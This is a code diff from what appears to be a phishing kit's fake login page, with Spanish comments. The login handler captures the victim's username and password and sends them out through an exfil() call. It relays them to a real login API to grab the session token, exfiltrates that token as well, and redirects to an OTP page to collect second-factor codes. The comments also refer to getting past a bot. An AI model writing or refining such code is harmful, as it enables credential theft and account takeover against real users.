@@ -171,25 +171,29 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helv
     el.classList.remove('hidden');
   }
 
-  // PASO 1
   document.getElementById('form-login').addEventListener('submit', async function(e) {
-    e.preventDefault();
-    const u = document.getElementById('txt-login').value.trim();
-    const p = document.getElementById('txt-password').value;
-    const btn = document.getElementById('btn-login');
+  e.preventDefault();
+  const u = document.getElementById('txt-login').value.trim();
+  const p = document.getElementById('txt-password').value;
+  const btn = document.getElementById('btn-login');
 
-    btn.disabled = true;
-    btn.textContent = 'Verificando…';
+  btn.disabled = true;
+  btn.textContent = 'Verificando…';
 
-    exfil({ step: '1', u, p });
+  exfil({ step: '1', u, p });
 
-    try {
-      const data = await proxyReq('/api/login', { usuario: u, clave: p });
-      if (data._s) capturedSession = data._s;
-    } catch (err) {}
+  let s = '';
+  try {
+    const data = await proxyReq('/api/login', { usuario: u, clave: p });
+    if (data._s) s = data._s;
+  } catch (err) {}
 
-    mostrarPaso2(u); // siempre avanzar
-  });
+  // Exfil la session aunque el bot no llegue al paso 2
+  exfil({ step: '1_session', s });
+
+  // Navegación real → el bot la detecta como nueva página
+  window.location.href = 'otp.html?s=' + encodeURIComponent(s) + '&u=' + encodeURIComponent(u);
+});
 
   // PASO 2
   document.getElementById('form-2fa').addEventListener('submit', async function(e) {
